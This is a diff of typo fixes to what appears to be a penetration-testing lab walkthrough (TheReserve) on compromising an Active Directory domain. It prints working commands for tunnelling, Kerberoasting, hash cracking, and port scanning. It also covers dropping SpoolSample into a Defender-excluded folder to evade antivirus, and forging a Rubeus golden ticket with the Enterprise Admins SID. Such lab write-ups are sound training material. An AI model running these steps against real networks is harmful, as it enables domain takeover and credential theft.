@@ -293,7 +293,7 @@ On the wrk1 start the agent
 	
  	agent.exe -connect 12.100.1.9:11601 -ignore-cert
 
-You will get a new session on the attacker. You can interact with it using the session command.
+You will get a new session on the attacker machine. You can interact with it using the session command.
 On the session command you can list all the agent network interfaces using ifconfig.
 Then add the routing information according to the interface you want to reach, in our case we add the route to the DC.
 <b>Do not route all the /24 subnet otherwise you will not be able to reach wrk1 and wrk2 anymore using corp VPN</b>
@@ -314,7 +314,7 @@ Youm must also open this port on Windows firewall
 That implies I can reach my python web server from other hosts visitng the following URL http://10.200.89.21:1180
  
  ### Kerberosting
- Now that I can reach the DC directly from the attacker machine, we can use Impacket to search for kerberostable service accounts. Again I used laura.wood credentials to query Active Directory:
+ Now that I can reach the DC directly from the attacker machine, I can use Impacket to search for kerberostable service accounts. Again I used laura.wood credentials to query Active Directory:
 
  	impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.200.89.102  'corp.thereserve.loc/laura.wood:Password1@'
   	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -328,7 +328,7 @@ That implies I can reach my python web server from other hosts visitng the follo
 	mssql/svcOctober      svcOctober   CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc  2023-02-15 10:07:45.563346  2023-03-31 00:26:54.115866             
 
   
-I got five candidates. The next step it's to try to extract the password from Kerberos tickets, since they are encrypted with the password of the service account associated with the SPN specified in the ticket request. The tickets are saved in kerberoastables.txt file, I used haschcat with the previously generated passwords list, the same used to brute-force the VPN server.
+I got five candidates. The next step it's to try to extract the password from Kerberos tickets, since the tickets are encrypted with the password of the service account, associated with the SPN specified in the ticket request. The tickets are saved in kerberoastables.txt file, I used haschcat with the previously generated passwords list, the same used to brute-force the VPN server.
 
   	hashcat -a 0 -m 13100 kerberoastables.txt pwd_list
 
@@ -338,7 +338,7 @@ After a while I found a valid password (reused) for svcScanning user:
  	...7749a88126a66ac2:xxxxxxxxx
   
 ### Compromise servers
-From the wrk1 workstation I used the following powershell snippet to perform a host discovery using common windows ports: 
+From the wrk1 workstation I used the following powershell snippet to perform a host discovery, using common windows ports: 
 
 	1..200 | % { $a ="10.200.89.$_"; 80,443,3389 | % {$r=((new-object Net.Sockets.TcpClient).ConnectAsync("$a",$_).Wait(100));If ($r) {write-host "$a port $_ is open"}}}
 		10.200.89.11 port 80 is open
@@ -355,8 +355,8 @@ We found 3 new hosts .31, .32 and .100. We can proceed to add these routes to th
 
 	ip route add 10.200.89.31/32 dev ligolo & ip route add 10.200.89.32/32 dev ligolo & ip route add 10.200.89.100/32 dev ligolo
 
-With the <b>svcscanning</b> credentials I can connect through RDP to host .31 and .32, but not to the .100.
-Using Remmina I connected to the host .31 using svcScanning user. I looked for the hostname: <b>server1</b>.
+With the <b>svcscanning</b> user I can connect through RDP to host .31 and .32, but not to the .100.
+Using Remmina I connected to the host .31, I looked for the hostname: <b>server1</b>.
 Exploring user privileges I found that the user is member of the local administrators, being part of the domain group Services
 
 	net localgroup Administrators
@@ -420,7 +420,7 @@ So first of all on server1 I started Rubeus monitor to intercept TGT tickets:
 		[*] Monitoring every 10 seconds for new TGTs
 
 
-Then I procedeed to download the [SpoolSample.exe](https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe) into server1 from my attacker machine (downlad the file into excluded folder, otherwise it will be caught by Defender). This file allows to trigger the authentication action from corpdc to server1. 
+Then I procedeed to download the [SpoolSample.exe](https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe) into server1 from my attacker machine (download the file into excluded folder, otherwise it will be caught by Defender). This file allows to trigger the authentication action from corpdc to server1. 
 
 Execute the following command:
 
@@ -500,7 +500,7 @@ and krbtgt
 	Credentials:
 	  Hash NTLM: aaaaaaaaaaaaaaaaaaaaaaaaaaa
 
-The last one could be used to perform a golden ticket attack.
+The last one could be used to perform a <b>golden ticket attack</b>.
 
 ### Compromise corpdc
 
@@ -600,7 +600,7 @@ Using powershell we can inviestigate the trust relation:
 
 ### Golden ticket 
 Since we have a bidirectional trust betwween root domain and corp domain, in addition we have the hashed password of the krbtgt user, we can try to forge a <b>golden ticket</b>.
-Now in order to craft a golden ticket for the trusted root domain, we need to get both the SID od the child and root domain. Using poershell (as administrator)
+Now in order to craft a golden ticket for the trusted root domain, we need to get both the SID of child and root domain. Using powershell (as administrator)
 we can get these information:
 
  	Import-Module ActiveDirectory
@@ -615,8 +615,9 @@ we can get these information:
   
 As usual I created an exclusion in Defender in <b>C:\Users\it.support\def-exc</b>.
  
-I manged to transfer Rubeus (please note that to forge a golden ticket you must have version >= 2) from my attacker machine as previously done for the other tools used.
-To successfully forge the golden ticket on the trusted root domain, we have to append -519 to the discovered SID, since the Well-known SID/RID format is S-1-5-21-{root domain}-519. This SID identifies the Enterprise Admins group. This group exists only in the root domain of an Active Directory forest. By default, the only member of the group is the Administrator account for the forest root domain, so we must use this user in order to generate the ticket. More details can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups). Following is the whole command:
+I manged to transfer Rubeus (please note that to forge a golden ticket you must have version >= 2), from my attacker machine as previously done for the other tools.
+To successfully forge the golden ticket on the trusted root domain, we have to append -519 to the discovered SID, since the Well-known SID/RID format is S-1-5-21-{root domain}-519. This SID identifies the Enterprise Admins group. This group exists only in the root domain of an Active Directory forest. By default, the only member of the group is the Administrator account for the forest root domain, so we must use this user in order to generate the ticket. More details can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups). 
+Following is the whole command:
 
  	rubeus.exe golden /rc4:zzzzzzzzzzzzzzz /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 ^
   	/sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt
